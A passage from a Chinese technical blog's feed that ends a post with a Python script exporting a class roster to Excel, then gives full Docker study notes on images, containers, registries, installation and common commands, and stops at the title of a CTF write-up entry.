class="hljs-string">&#x27;吴永帅&#x27;</span>,<span class="hljs-number">28</span>:<span class="hljs-string">&#x27;颜亨太&#x27;</span>,<span class="hljs-number">30</span>:<span class="hljs-string">&#x27;张珈玮&#x27;</span>,<span class="hljs-number">31</span>:<span class="hljs-string">&#x27;张家朋&#x27;</span>,<span class="hljs-number">34</span>:<span class="hljs-string">&#x27;张子傲&#x27;</span>,<span class="hljs-number">35</span>:<span class="hljs-string">&#x27;赵瑞&#x27;</span>,<span class="hljs-number">36</span>:<span class="hljs-string">&#x27;赵永旺&#x27;</span>,<span class="hljs-number">37</span>:<span class="hljs-string">&#x27;赵振&#x27;</span>,<span class="hljs-number">38</span>:<span class="hljs-string">&#x27;朱苏宁&#x27;</span>,<span class="hljs-number">39</span>:<span class="hljs-string">&#x27;朱唐喜&#x27;</span>,<span class="hljs-number">40</span>:<span class="hljs-string">&#x27;庄廷泽&#x27;</span>,<span class="hljs-number">41</span>:<span class="hljs-string">&#x27;邹超磊&#x27;</span>&#125;<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write_excel</span>():</span><br>    workbook = xlsxwriter.Workbook(<span class="hljs-string">&#x27;student_442.xlsx&#x27;</span>)<br>    worksheet = workbook.add_worksheet(<span class="hljs-string">u&#x27;student&#x27;</span>)<br>    worksheet.write(<span class="hljs-string">&#x27;A1&#x27;</span>, <span class="hljs-string">&#x27;学号&#x27;</span>)<br>    worksheet.write(<span class="hljs-string">&#x27;B1&#x27;</span>, <span class="hljs-string">&#x27;姓名&#x27;</span>)<br>    i=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> key, value <span class="hljs-keyword">in</span> dict_stu.items():<br>            worksheet.write(i + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, key)<br>            worksheet.write(i+<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,value)<br>            i+=<span class="hljs-number">1</span><br>    workbook.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    write_excel();<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;写入成功&#x27;</span>)<br></code></pre></td></tr></table></figure><p>这样子就成功了，很不理解。</p><img src="/2021/12/16/summary1/image-20220410132153437.png" class="" title="image-20220410132153437"><h3 id="0x09-eve-ng中用VNC远程windows虚拟机时，出现-reading-version-failed-not-an-RFB-server？-，造成无法连接的问题"><a href="#0x09-eve-ng中用VNC远程windows虚拟机时，出现-reading-version-failed-not-an-RFB-server？-，造成无法连接的问题" class="headerlink" title="0x09 eve-ng中用VNC远程windows虚拟机时，出现 reading version failed:not an RFB server？ ，造成无法连接的问题"></a>0x09 eve-ng中用VNC远程windows虚拟机时，出现 reading version failed:not an RFB server？ ，造成无法连接的问题</h3>]]></content>
    
    
    <categories>
      
      <category>总结</category>
      
    </categories>
    
    
    <tags>
      
      <tag>总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker学习记录</title>
    <link href="/2021/12/12/dockerstudy1/"/>
    <url>/2021/12/12/dockerstudy1/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学了这么久的docker，该记一记笔记了。笔记参考于GitHub大佬们写的一本书：<a href="https://vuepress.mirror.docker-practice.com/">Docker从入门到实践</a>，以及<a href="https://docs.docker.com/get-started/overview/">Docker官方文档</a>。</p><h3 id="1-Docker的基本概念"><a href="#1-Docker的基本概念" class="headerlink" title="1. Docker的基本概念"></a>1. Docker的基本概念</h3><p>我们可以把docker可以分成三大部分：镜像、容器和仓库，理解了这三个概念，就理解了 <strong>Docker</strong> 的整个生命周期。</p><h4 id="镜像-image"><a href="#镜像-image" class="headerlink" title="镜像(image)"></a>镜像(image)</h4><p>我们都知道，操作系统分为 <strong>内核</strong> 和 <strong>用户空间</strong>。对于 <code>Linux</code> 而言，内核启动后，会挂载 <code>root</code> 文件系统为其提供用户空间支持。而 <strong>Docker 镜像</strong>（<code>Image</code>），就相当于是一个 <code>root</code> 文件系统。比如官方镜像 <code>ubuntu:18.04</code> 就包含了完整的一套 Ubuntu 18.04 最小系统的 <code>root</code> 文件系统。</p><p><strong>Docker 镜像</strong> 是一个特殊的文件系统，除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。镜像 <strong>不包含</strong> 任何动态数据，其内容在构建之后也不会被改变。</p><p>docker镜像就好比一个模板，可以通过这个模板来创建容器服务，tomcat镜像===&gt;run==&gt;tomcat01 容器(提供服务器)，通过这个镜像可以创建多个容器(最终服务运行或者项目运行就是在容器中的)。</p><p> <strong>分层存储</strong></p><p>因为镜像包含操作系统完整的 <code>root</code> 文件系统，其体积往往是庞大的，因此在 Docker 设计时，就充分利用 <a href="https://en.wikipedia.org/wiki/Union_mount">Union FS (opens new window)</a>的技术，将其设计为分层存储的架构。所以严格来说，镜像并非是像一个 <code>ISO</code> 那样的打包文件，镜像只是一个虚拟的概念，其实际体现并非由一个文件组成，而是由一组文件系统组成，或者说，由多层文件系统联合组成。</p><p>镜像构建时，会一层层构建，前一层是后一层的基础。每一层构建完就不会再发生改变，后一层上的任何改变只发生在自己这一层。比如，删除前一层文件的操作，实际不是真的删除前一层的文件，而是仅在当前层标记为该文件已删除。在最终容器运行的时候，虽然不会看到这个文件，但是实际上该文件会一直跟随镜像。因此，在构建镜像的时候，需要额外小心，每一层尽量只包含该层需要添加的东西，任何额外的东西应该在该层构建结束前清理掉。</p><p>分层存储的特征还使得镜像的复用、定制变的更为容易。甚至可以用之前构建好的镜像作为基础层，然后进一步添加新的层，以定制自己所需的内容，构建新的镜像。</p><p>Docker在运行容器前需要本地存在对应的镜像，如果镜像不存在，Docker会尝试先从默认镜像仓库下载（默认使用Docker Hub公共注册服务器中的仓库），用户也可以通过配置，使用自定义的镜像仓库。</p><img src="/2021/12/12/dockerstudy1/image-20211213200759298.png" class="" title="image-20211213200759298"><p>虚悬镜像</p><p>一个特殊的镜像，这个镜像既没有仓库名，也没有标签，均为 <code>&lt;none&gt;</code>。：</p><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs bash">&lt;none&gt;               &lt;none&gt;              00285df0df87        5 days ago          342 MB<br></code></pre></td></tr></table></figure><p>这个镜像原本是有镜像名和标签的，但随着官方镜像的维护，发不了新的版本，重新上传了镜像，原来的标签就被废弃了。</p><h4 id="容器-container"><a href="#容器-container" class="headerlink" title="容器(container)"></a><strong>容器(container)</strong></h4><p>镜像（<code>Image</code>）和容器（<code>Container</code>）的关系，就像是面向对象程序设计中的 <code>类</code> 和 <code>实例</code> 一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。</p><p>容器的实质是进程，但与直接在宿主执行的进程不同，容器进程运行于属于自己的独立的 <a href="https://en.wikipedia.org/wiki/Linux_namespaces">命名空间 (opens new window)</a>。因此容器可以拥有自己的 <code>root</code> 文件系统、自己的网络配置、自己的进程空间，甚至自己的用户 ID 空间。容器内的进程是运行在一个隔离的环境里，使用起来，就好像是在一个独立于宿主的系统下操作一样。这种特性使得容器封装的应用比直接在宿主运行更加安全。也因为这种隔离的特性，很多人初学 Docker 时常常会混淆容器和虚拟机。</p><p>前面讲过镜像使用的是分层存储，容器也是如此。每一个容器运行时，是以镜像为基础层，在其上创建一个当前容器的存储层，我们可以称这个为容器运行时读写而准备的存储层为 <strong>容器存储层</strong>。</p><p>容器存储层的生存周期和容器一样，容器消亡时，容器存储层也随之消亡。因此，任何保存于容器存储层的信息都会随容器删除而丢失。</p><p>按照 Docker 最佳实践的要求，容器不应该向其存储层内写入任何数据，容器存储层要保持无状态化。所有的文件写入操作，都应该使用 <a href="https://vuepress.mirror.docker-practice.com/data_management/volume.html">数据卷（Volume）</a>、或者 <a href="https://vuepress.mirror.docker-practice.com/data_management/bind-mounts.html">绑定宿主目录</a>，在这些位置的读写会跳过容器存储层，直接对宿主（或网络存储）发生读写，其性能和稳定性更高。</p><p>数据卷的生存周期独立于容器，容器消亡，数据卷不会消亡。因此，使用数据卷后，容器删除或者重新运行之后，数据却不会丢失。</p><h4 id="仓库-repository"><a href="#仓库-repository" class="headerlink" title="仓库(repository)"></a><strong>仓库(repository)</strong></h4><p>仓库就是用来存放镜像的地方！仓库分为公有仓库和私有仓库。</p><p>镜像构建完成后，可以很容易的在当前宿主机上运行，但是，如果需要在其它服务器上使用这个镜像，我们就需要一个集中的存储、分发镜像的服务，<a href="https://vuepress.mirror.docker-practice.com/repository/registry.html">Docker Registry</a> 就是这样的服务。</p><p>一个 <strong>Docker Registry</strong> 中可以包含多个 <strong>仓库</strong>（<code>Repository</code>）；每个仓库可以包含多个 <strong>标签</strong>（<code>Tag</code>）；每个标签对应一个镜像。</p><p>通常，一个仓库会包含同一个软件不同版本的镜像，而标签就常用于对应该软件的各个版本。我们可以通过 <code>&lt;仓库名&gt;:&lt;标签&gt;</code> 的格式来指定具体是这个软件哪个版本的镜像。如果不给出标签，将以 <code>latest</code> 作为默认标签。</p><p>以 <a href="https://hub.docker.com/_/ubuntu">Ubuntu 镜像 (opens new window)</a>为例，<code>ubuntu</code> 是仓库的名字，其内包含有不同的版本标签，如，<code>16.04</code>, <code>18.04</code>。我们可以通过 <code>ubuntu:16.04</code>，或者 <code>ubuntu:18.04</code> 来具体指定所需哪个版本的镜像。如果忽略了标签，比如 <code>ubuntu</code>，那将视为 <code>ubuntu:latest</code>。</p><p>仓库名经常以 <em>两段式路径</em> 形式出现，比如 <code>jwilder/nginx-proxy</code>，前者往往意味着 Docker Registry 多用户环境下的用户名，后者则往往是对应的软件名。但这并非绝对，取决于所使用的具体 Docker Registry 的软件或服务。</p><h4 id="注册服务器"><a href="#注册服务器" class="headerlink" title="注册服务器"></a><strong>注册服务器</strong></h4><p>仓库注册服务器是存放仓库的地方，其上往往存放着多个仓库。</p><p> <strong>Docker Registry 公开服务</strong></p><p>Docker Registry 公开服务是开放给用户使用、允许用户管理镜像的 Registry 服务。一般这类公开服务允许用户免费上传、下载公开的镜像，并可能提供收费服务供用户管理私有镜像。</p><p>最常使用的 Registry 公开服务是官方的 <a href="https://hub.docker.com/">Docker Hub (opens new window)</a>，这也是默认的 Registry，并拥有大量的高质量的 <a href="https://hub.docker.com/search?q=&type=image&image_filter=official">官方镜像 (opens new window)</a>。除此以外，还有 Red Hat 的 <a href="https://quay.io/repository/">Quay.io (opens new window)</a>；Google 的 <a href="https://cloud.google.com/container-registry/">Google Container Registry (opens new window)</a>，<a href="https://kubernetes.io/">Kubernetes (opens new window)</a>的镜像使用的就是这个服务；代码托管平台 <a href="https://github.com/">GitHub (opens new window)</a>推出的 <a href="https://docs.github.com/cn/packages/working-with-a-github-packages-registry/working-with-the-container-registry">ghcr.io (opens new window)</a>。</p><p>由于某些原因，在国内访问这些服务可能会比较慢。国内的一些云服务商提供了针对 Docker Hub 的镜像服务（<code>Registry Mirror</code>），这些镜像服务被称为 <strong>加速器</strong>。常见的有 <a href="https://www.aliyun.com/product/acr?source=5176.11533457&userCode=8lx5zmtu">阿里云加速器 (opens new window)</a>、<a href="https://www.daocloud.io/mirror#accelerator-doc">DaoCloud 加速器 (opens new window)</a>等。使用加速器会直接从国内的地址下载 Docker Hub 的镜像，比直接从 Docker Hub 下载速度会提高很多。在 <a href="https://vuepress.mirror.docker-practice.com/install/mirror.html">安装 Docker</a> 一节中有详细的配置方法。</p><p>国内也有一些云服务商提供类似于 Docker Hub 的公开服务。比如 <a href="https://c.163.com/hub#/m/library/">网易云镜像服务 (opens new window)</a>、<a href="https://hub.daocloud.io/">DaoCloud 镜像市场 (opens new window)</a>、<a href="https://www.aliyun.com/product/acr?source=5176.11533457&userCode=8lx5zmtu">阿里云镜像库 (opens new window)</a>等。</p><p><strong>私有 Docker Registry</strong></p><p>除了使用公开服务外，用户还可以在本地搭建私有 Docker Registry。Docker 官方提供了 <a href="https://hub.docker.com/_/registry/">Docker Registry (opens new window)</a>镜像，可以直接使用做为私有 Registry 服务。在 <a href="https://vuepress.mirror.docker-practice.com/repository/registry.html">私有仓库</a> 一节中，会有进一步的搭建私有 Registry 服务的讲解。</p><p>开源的 Docker Registry 镜像只提供了 <a href="https://docs.docker.com/registry/spec/api/">Docker Registry API (opens new window)</a>的服务端实现，足以支持 <code>docker</code> 命令，不影响使用。但不包含图形界面，以及镜像维护、用户管理、访问控制等高级功能。</p><p>除了官方的 Docker Registry 外，还有第三方软件实现了 Docker Registry API，甚至提供了用户界面以及一些高级功能。比如，<a href="https://github.com/goharbor/harbor">Harbor (opens new window)</a>和 <a href="https://vuepress.mirror.docker-practice.com/repository/nexus3_registry.html">Sonatype Nexus</a>。</p><h3 id="2-Docker的原理"><a href="#2-Docker的原理" class="headerlink" title="2.Docker的原理"></a>2.Docker的原理</h3><h4 id="1-1-Docker-架构"><a href="#1-1-Docker-架构" class="headerlink" title="1.1 Docker 架构"></a>1.1 Docker 架构</h4><p>在安装docker之前，先了解它的原理，我们可以直接从它的架构开始，Docker 使用客户端-服务器架构。Docker<em>客户端</em>与 Docker<em>守护进程</em>对话，后者负责构建、运行和分发 Docker 容器的繁重工作。Docker 客户端和守护程序<em>可以</em> 运行在同一系统上，或者可以将 Docker 客户端连接到远程 Docker 守护程序。Docker 客户端和守护进程使用 REST API、UNIX 套接字或网络接口进行通信。另一个 Docker 客户端是 Docker Compose，它允许使用由一组容器组成的应用程序。</p><img src="/2021/12/12/dockerstudy1/image-20211213193212761.png" class=""><p>也就是说，Docker 是一个Client-Server 结构的系统，Docker的守护进程运行在主机上，通过Socket从客户端访问，而DockerServer 接收到Docker-Client 的指令，就会执行这个命令。</p><img src="/2021/12/12/dockerstudy1/image-20211213201422772.png" class="" title="image-20211213201422772"><h4 id="1-2-docker-底层原理"><a href="#1-2-docker-底层原理" class="headerlink" title="1.2 docker 底层原理"></a>1.2 docker 底层原理</h4><p>Docker 是用<a href="https://golang.org/">Go 编程语言</a>编写的，并利用 Linux 内核的几个特性来提供其功能。Docker 使用一种<code>namespaces</code>称为<em>容器</em>的技术来提供隔离的工作空间。当您运行一个容器时，Docker 会为该容器创建一组 <em>命名空间</em>。这些命名空间提供了一层隔离。容器的每个方面都在单独的命名空间中运行，并且其访问权限仅限于该命名空间。</p><p>#docker为什么比VM快? </p><p>1、Docker有着比虚拟机更少的抽象层。</p><p>2、docker 利用的是宿主机的内核，vm需要的是Guest OS。</p><img src="/2021/12/12/dockerstudy1/image-20211213201820274.png" class="" title="image-20211213201820274"><p>所以说，新建一个容器的时候，docker不需要像虚拟机一样重新加载一个系统内核，避免引导，虚拟机是加载Guest OS，分钟级别的，而docker 是利用宿主机的操作系统，省略了这个复杂的过程，秒级!</p><img src="/2021/12/12/dockerstudy1/image-20211213202617809.png" class="" title="image-20211213202617809"><h4 id="2-Docker的安装"><a href="#2-Docker的安装" class="headerlink" title="2.Docker的安装"></a>2.Docker的安装</h4><p><strong>这里的安装以kali Linux安装docker-ce为例。</strong></p><p>(1)使用的清华镜像:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl -fsSL https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/gpg | sudo apt-key add -<br></code></pre></td></tr></table></figure><p>(2)配置docker apt ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &#x27;deb [arch=amd64] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/ buster stable&#x27; | sudo tee /etc/apt/sources.list.d/docker.list<br></code></pre></td></tr></table></figure><p>(3)更新apt:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get update<br></code></pre></td></tr></table></figure><p>(4)安装docker：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install docker-ce<br></code></pre></td></tr></table></figure><p>(5)查看docker版本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker -v<br></code></pre></td></tr></table></figure><p>好了，安装完成了。</p><ol start="2"><li>docker的常用命令</li></ol><h3 id="3-docker镜像操作"><a href="#3-docker镜像操作" class="headerlink" title="3. docker镜像操作"></a>3. docker镜像操作</h3><h4 id="3-1获取镜像"><a href="#3-1获取镜像" class="headerlink" title="3.1获取镜像"></a>3.1获取镜像</h4><p>其中，NAME是镜像仓库名称(用来区分镜像),TAG是镜像的标签（往往用来表示版本信息)。通常情况下，描述一个镜像需要包括“名称+标签”信息。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker pull [选项] [Docker Registry 地址[:端口号]/]仓库名[:标签]<br></code></pre></td></tr></table></figure><p>具体的选项可以通过 <code>docker pull --help</code> 命令看到，这里我们说一下镜像名称的格式。</p><ul><li>Docker 镜像仓库地址：地址的格式一般是 <code>&lt;域名/IP&gt;[:端口号]</code>。默认地址是 Docker Hub(<code>docker.io</code>)。</li><li>仓库名：如之前所说，这里的仓库名是两段式名称，即 <code>&lt;用户名&gt;/&lt;软件名&gt;</code>。对于 Docker Hub，如果不给出用户名，则默认为 <code>library</code>，也就是官方镜像。</li></ul><p>若不加标签,默认是拉取最新版。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker pull ubuntu<br><br>Using default tag:latest<br>latest:Pulling from libraay/ubuntu<br></code></pre></td></tr></table></figure><p>从下载过程中可以看到我们之前提及的分层存储的概念，镜像是由多层存储所构成。下载也是一层层的去下载，并非单一文件。下载过程中给出了每一层的 ID 的前 12 位。并且下载结束后，给出该镜像完整的 <code>sha256</code> 的摘要，以确保下载一致性。</p><p>在使用上面命令的时候，你可能会发现，你所看到的层 ID 以及 <code>sha256</code> 的摘要和这里的不一样。这是因为官方镜像是一直在维护的，有任何新的 bug，或者版本更新，都会进行修复再以原来的标签发布，这样可以确保任何使用这个标签的用户可以获得更安全、更稳定的镜像。</p><p>如果获取镜像太慢，则需要配置镜像加速器。</p><h4 id="3-2查看镜像信息"><a href="#3-2查看镜像信息" class="headerlink" title="3.2查看镜像信息"></a>3.2查看镜像信息</h4><p>(1).使用images命令列出镜像，不加任何参数的情况下，<code>docker image ls</code> 会列出所有顶层镜像，其中[]为可选项。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker image ls [-a/-f/-q]<br></code></pre></td></tr></table></figure><p>(2).使用tag命令添加镜像标签，docker tag命令来为本地镜像任意添加新的标签。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker tag ubuntu:latest myubuntu:latest<br></code></pre></td></tr></table></figure><p>(3).使用inspect命令查看详细信息,使用docker[image]inspect命令可以获取该镜像的详细信息，包括制作者、适应架构、各层的数字摘要等。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker image inspect ubuntu:18.04<br></code></pre></td></tr></table></figure><p>(4).使用history命令查看镜像历史,该命令将列出各层的创建信息。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker history ubuntu:18.04<br></code></pre></td></tr></table></figure><h4 id="3-3搜寻镜像"><a href="#3-3搜寻镜像" class="headerlink" title="3.3搜寻镜像"></a>3.3搜寻镜像</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker search [] keyword<br></code></pre></td></tr></table></figure><h4 id="3-4-运行"><a href="#3-4-运行" class="headerlink" title="3.4 运行"></a>3.4 运行</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -it --rm --name ubuntu ubuntu:18.04 /bin/bash<br></code></pre></td></tr></table></figure><ul><li><code>-it</code>：这是两个参数，一个是 <code>-i</code>：交互式操作，一个是 <code>-t</code> 终端。我们这里打算进入 <code>bash</code> 执行一些命令并查看返回结果，因此我们需要交互式终端。</li><li><code>--name</code>:`这个参数是给容器重命名，方便后续的操作。</li><li><code>--rm</code>：这个参数是说容器退出后随之将其删除。默认情况下，为了排障需求，退出的容器并不会立即删除，除非手动 <code>docker rm</code>。我们这里只是随便执行个命令，看看结果，不需要排障和保留结果，因此使用 <code>--rm</code> 可以避免浪费空间。</li><li><code>ubuntu:18.04</code>：这是指用 <code>ubuntu:18.04</code> 镜像为基础来启动容器。</li><li><code>bash</code>：放在镜像名后的是 <strong>命令</strong>，这里我们希望有个交互式 Shell，因此用的是 <code>bash</code>。</li></ul><p>进入容器后，我们可以在 Shell 下操作，执行任何所需的命令。这里，我们执行了 <code>cat /etc/os-release</code>，这是 Linux 常用的查看当前系统版本的命令，从返回的结果可以看到容器内是 <code>Ubuntu 18.04.1 LTS</code> 系统。</p><p>最后我们通过 <code>exit</code> 退出了这个容器。</p><h4 id="3-5删除和清理镜像"><a href="#3-5删除和清理镜像" class="headerlink" title="3.5删除和清理镜像"></a>3.5删除和清理镜像</h4><p>(1).使用标签删除镜像,使用docker rmi或docker image rm命令可以删除镜像,其中IMAGE可以为标签或ID。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker rmi IMAGE[IMAGE.....]<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">若要强行删除镜像,可以使用-f参数</span><br>docker rmi -f ubuntu:18.04<br></code></pre></td></tr></table></figure><p>(2).使用镜像ID来删除镜像,需要注意的是，如果该镜像创建的容器存在时，镜像文件默认是无法删除的。</p><h4 id="3-5创建镜像"><a href="#3-5创建镜像" class="headerlink" title="3.5创建镜像"></a>3.5创建镜像</h4><p>在终端下，运行以下命令能够创建镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker build -t getting-started <br></code></pre></td></tr></table></figure><h4 id="3-6导入和导出镜像"><a href="#3-6导入和导出镜像" class="headerlink" title="3.6导入和导出镜像"></a>3.6导入和导出镜像</h4><p><strong>导出镜像</strong></p><p>使用 <code>docker save</code> 命令可以将本地ubuntu镜像保存为归档文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker save ubuntu -o ubuntu-18.04-x86_64.tar.gz <br></code></pre></td></tr></table></figure><p>(1).从rootfs压缩包导入</p><p>格式：<code>docker import [选项] &lt;文件&gt;|&lt;URL&gt;|- [&lt;仓库名&gt;[:&lt;标签&gt;]]</code></p><p>压缩包可以是本地文件、远程 Web 文件，甚至是从标准输入中得到。压缩包将会在镜像 <code>/</code> 目录展开，并直接作为镜像第一层提交。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker import ubuntu-18.04-x86_64.tar.gz joker/unbuntu:18.04<br></code></pre></td></tr></table></figure><p>(2).使用<code>docker load</code>进行导入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker load -i alpine-latest.tar.gz<br></code></pre></td></tr></table></figure><h4 id="3-7上传镜像"><a href="#3-7上传镜像" class="headerlink" title="3.7上传镜像"></a>3.7上传镜像</h4><p>将本地的镜像上传到镜像仓库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker push [OPTIONS] NAME[:TAG]<br></code></pre></td></tr></table></figure><h3 id="4-docker容器命令"><a href="#4-docker容器命令" class="headerlink" title="4. docker容器命令"></a>4. docker容器命令</h3><h4 id="4-1启动容器"><a href="#4-1启动容器" class="headerlink" title="4.1启动容器"></a>4.1启动容器</h4><p>启动容器有两种方式，一种是基于镜像新建一个容器并启动，另外一个是将在终止状态（<code>exited</code>）的容器重新启动。</p><p><strong>新建并启动</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -it --rm --name ubuntu -p 宿主机端口:容器端口 -v /root/test:/root ubuntu:18.04 /bin/bash<br></code></pre></td></tr></table></figure><ul><li><code>-it</code>：<code>-t</code>选项让Docker分配一个伪终端（pseudo-tty）并绑定到容器的标准输入上，<code>-i</code> 则让容器的标准输入保持打开。</li><li><code>--name</code>: 给容器进行重命名。</li><li><code>-p</code>: 将容器端口映射至主机端口，若-p为大写则随机分配端口。</li><li><code>-v</code>: 将容器文件目录挂载至本机目录。</li></ul><p><strong>启动已终止的容器</strong></p><p>可以利用 <code>docker container start</code> 命令，直接将一个已经终止（<code>exited</code>）的容器启动运行。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker container start 容器名<br></code></pre></td></tr></table></figure><h4 id="4-2终止容器"><a href="#4-2终止容器" class="headerlink" title="4.2终止容器"></a>4.2终止容器</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker stop 容器名/id<br></code></pre></td></tr></table></figure><h4 id="4-3后台运行"><a href="#4-3后台运行" class="headerlink" title="4.3后台运行"></a>4.3后台运行</h4><p>在使用 <code>-d</code> 参数时，容器启动后会进入后台。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -d ubuntu:18.04 /bin/bash<br></code></pre></td></tr></table></figure><h4 id="4-4进入容器"><a href="#4-4进入容器" class="headerlink" title="4.4进入容器"></a>4.4进入容器</h4><p>(1).在使用 <strong>-d</strong> 参数时，容器启动后会自动进入后台，可以通过一下命令进入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker attach 容器名/id<br></code></pre></td></tr></table></figure><p>但进入容器后，如果从这个容器退出，会导致容器的停止，并且只能同时使用一个终端。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker exec -it 容器名/id /bin/bash<br></code></pre></td></tr></table></figure><p> 如果从这个容器退出，容器不会停止。</p><p>(2).在启动容器时，若使用了-it参数，则会自动进入容器。</p><h4 id="4-5删除容器"><a href="#4-5删除容器" class="headerlink" title="4.5删除容器"></a>4.5删除容器</h4><p>使用docker rm删除命令,<code>-f</code>: 强制删除。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker rm -f 容器名/id<br></code></pre></td></tr></table></figure><h4 id="4-6导出和导入容器"><a href="#4-6导出和导入容器" class="headerlink" title="4.6导出和导入容器"></a>4.6导出和导入容器</h4><p><strong>导出容器</strong></p><p>如果要导出本地某个容器，可以使用 <code>docker export</code> 命令。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker export 容器名/id &gt; ubuntu18.04.tar<br></code></pre></td></tr></table></figure><p><strong>导入容器快照</strong></p><p>可以使用 <code>docker import</code> 从容器快照文件中再导入为镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat ubuntu.tar | docker import - test/ubuntu:v1.0<br></code></pre></td></tr></table></figure><p>此外，也可以通过指定 URL 或者某个目录来导入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker import http://example.com/exampleimage.tgz example/imagerepo<br></code></pre></td></tr></table></figure><p><em>注：用户既可以使用 <code>docker load</code> 来导入镜像存储文件到本地镜像库，也可以使用 <code>docker import</code> 来导入一个容器快照到本地镜像库。这两者的区别在于容器快照文件将丢弃所有的历史记录和元数据信息（即仅保存容器当时的快照状态），而镜像存储文件将保存完整记录，体积也要大。此外，从容器快照文件导入时可以重新指定标签等元数据信息。</em></p>]]></content>
    
    
    <categories>
      
      <category>虚拟化</category>
      
    </categories>
    
    
    <tags>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NUAACTF2021</title>
    <link href="/2021/12/11/NUAACTF2021/"/>
    <url>/2021/12/11/NUAACTF2021/</url>
    
